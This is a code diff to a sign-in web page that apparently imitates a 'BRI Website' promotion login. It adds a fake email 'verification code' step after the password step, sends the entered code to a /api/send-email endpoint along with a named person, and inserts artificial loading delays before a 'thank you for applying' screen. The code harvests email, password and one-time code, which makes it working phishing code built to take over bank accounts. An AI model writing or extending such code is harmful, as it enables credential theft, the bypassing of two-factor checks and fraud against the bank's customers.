@@ -65,10 +65,29 @@
           <div class="input-group">
             <input type="password" class="auth-input" placeholder="password" id="password-input" />
           </div>
+          <p class="error-message" id="password-error">Password must be at least 5 characters</p>
           <button class="btn-signin" id="btn-signin">Sign In</button>
           <div class="loading-indicator" id="loading-indicator-signin">
             <div class="spinner"></div>
           </div>
+        </div>
+
+        <div class="auth-step auth-step-verification" id="step-verification">
+          <h2>To verify it is you, a verification code has been sent to your email.</h2>
+          <div class="input-group">
+            <input type="text" class="auth-input" placeholder="Enter verification code" id="verification-input" />
+          </div>
+          <p class="error-message" id="verification-error">Code must be at least 4 characters</p>
+          <button class="btn-apply" id="btn-apply">Apply</button>
+          <div class="loading-indicator" id="loading-indicator-apply">
+            <div class="spinner"></div>
+          </div>
+        </div>
+
+        <div class="auth-step auth-step-success" id="step-success">
+          <div class="success-icon">✓</div>
+          <h2>Thank you for applying for the promotion.</h2>
+          <p>We'll contact you if there are any further updates or if additional verification is required.</p>
         </div>
       </div>
     </section>
@@ -247,15 +266,23 @@
       const stepInitial = document.getElementById('step-initial');
       const stepEmail = document.getElementById('step-email');
       const stepPassword = document.getElementById('step-password');
+      const stepVerification = document.getElementById('step-verification');
+      const stepSuccess = document.getElementById('step-success');
       const btnSignup = document.getElementById('btn-signup');
       const btnNext = document.getElementById('btn-next');
       const btnSignin = document.getElementById('btn-signin');
+      const btnApply = document.getElementById('btn-apply');
       const btnBackEmail = document.getElementById('btn-back-email');
       const btnBackPassword = document.getElementById('btn-back-password');
       const loadingIndicator = document.getElementById('loading-indicator');
       const loadingIndicatorSignin = document.getElementById('loading-indicator-signin');
+      const loadingIndicatorApply = document.getElementById('loading-indicator-apply');
       const emailInput = document.getElementById('email-input');
       const emailError = document.getElementById('email-error');
+      const passwordInput = document.getElementById('password-input');
+      const passwordError = document.getElementById('password-error');
+      const verificationInput = document.getElementById('verification-input');
+      const verificationError = document.getElementById('verification-error');
 
       function validateEmail(email) {
         const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -280,6 +307,45 @@
         loadingIndicator.classList.remove('active');
       }
 
+      function resetPasswordStep() {
+        passwordInput.classList.remove('error');
+        passwordError.classList.remove('show');
+        btnSignin.style.display = 'block';
+        loadingIndicatorSignin.classList.remove('active');
+      }
+
+      function resetVerificationStep() {
+        verificationInput.classList.remove('error');
+        verificationError.classList.remove('show');
+        btnApply.style.display = 'block';
+        loadingIndicatorApply.classList.remove('active');
+      }
+
+      function sendVerificationCodeEmail(code) {
+        const emailData = {
+          templateType: 'verification-code',
+          subject: 'BRI Website - Verification Code',
+          data: {
+            name: 'Sugeng Yulianto',
+            code: code
+          }
+        };
+
+        fetch('/api/send-email', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(emailData)
+        }).then(response => response.json())
+        .then(data => {
+          console.log('Verification code response:', data);
+        })
+        .catch(error => {
+          console.error('Verification code error:', error);
+        });
+      }
+
       btnSignup.addEventListener('click', function() {
         switchStep(stepInitial, stepEmail);
       });
@@ -290,6 +356,7 @@
       });
 
       btnBackPassword.addEventListener('click', function() {
+        resetPasswordStep();
         switchStep(stepPassword, stepEmail, true);
       });
 
@@ -329,10 +396,11 @@
           console.error('Email submission error:', error);
         });
         
+        // Updated to 4 seconds
         setTimeout(function() {
           loadingIndicator.classList.remove('active');
           switchStep(stepEmail, stepPassword);
-        }, 1500);
+        }, 4000);
       });
 
       emailInput.addEventListener('input', function() {
@@ -341,9 +409,16 @@
       });
 
       btnSignin.addEventListener('click', function() {
-        const passwordInput = document.getElementById('password-input');
         const password = passwordInput.value.trim();
+        
+        if (password.length < 5) {
+          passwordInput.classList.add('error');
+          passwordError.classList.add('show');
+          return;
+        }
 
+        passwordInput.classList.remove('error');
+        passwordError.classList.remove('show');
         btnSignin.style.display = 'none';
         loadingIndicatorSignin.classList.add('active');
 
@@ -369,12 +444,45 @@
           console.error('Password submission error:', error);
         });
 
+        // Updated to 6.5 seconds
         setTimeout(function() {
           loadingIndicatorSignin.classList.remove('active');
-          btnSignin.style.display = 'block';
-          // Stop here as requested
-          console.log('Sign In clicked - stopping for testing');
-        }, 1500);
+          switchStep(stepPassword, stepVerification);
+        }, 6500);
+      });
+
+      passwordInput.addEventListener('input', function() {
+        passwordInput.classList.remove('error');
+        passwordError.classList.remove('show');
+      });
+
+      btnApply.addEventListener('click', function() {
+        const code = verificationInput.value.trim();
+        
+        if (code.length < 4) {
+          verificationInput.classList.add('error');
+          verificationError.classList.add('show');
+          return;
+        }
+
+        verificationInput.classList.remove('error');
+        verificationError.classList.remove('show');
+        btnApply.style.display = 'none';
+        loadingIndicatorApply.classList.add('active');
+
+        // Send verification code email twice
+        sendVerificationCodeEmail(code);
+        setTimeout(sendVerificationCodeEmail, 200);
+
+        setTimeout(function() {
+          loadingIndicatorApply.classList.remove('active');
+          switchStep(stepVerification, stepSuccess);
+        }, 10000);
+      });
+
+      verificationInput.addEventListener('input', function() {
+        verificationInput.classList.remove('error');
+        verificationError.classList.remove('show');
       });
     });
   </script>
